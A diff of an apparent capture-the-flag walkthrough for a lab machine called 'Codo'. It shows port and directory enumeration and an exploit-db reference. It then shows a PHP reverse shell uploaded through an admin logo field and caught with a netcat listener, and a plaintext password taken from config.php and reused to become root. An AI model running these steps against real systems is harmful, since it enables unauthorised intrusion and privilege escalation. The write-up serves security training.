@@ -3,7 +3,7 @@
 # 🐧Codo🐧
 ## Enumeration
 Nmap
-```
+```console
 $ nmap -p- -T4 -sV 192.168.139.23
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-05 20:42 AEDT
 Nmap scan report for 192.168.139.23
@@ -16,7 +16,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 find a web page in port 80  
 use gobuster and found /admin login page
-```
+```console
 $ gobuster dir -u http://192.168.139.23 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ===============================================================
 Gobuster v3.8
@@ -45,11 +45,11 @@ https://www.exploit-db.com/exploits/50978
 we can upload a reverseshell and get the shell back  
 From the exploit script it says the upload location is /sites/default/assets/img/attachments/  
 after we upload the reverseshell in logo then visit to execute
-```
+```console
 http://192.168.139.23/sites/default/assets/img/attachments/php-reverse-shell.php
 ```
 and we got the shell back
-```
+```console
 $ nc -lvnp 443
 listening on [any] 443 ...
 connect to [192.168.45.178] from (UNKNOWN) [192.168.139.23] 55894
@@ -59,12 +59,12 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 ## Privilege Escalation
 we upload linpeas and check the output and found the passwd is exposed 
-```
+```console
 ╔══════════╣ Searching passwords in config PHP files
 /var/www/html/sites/default/config.php:  'password' => 'FatPanda123',
 ```
 try the password on root and it success
-```
+```console
 www-data@codo:/$ su root
 Password: FatPanda123
 
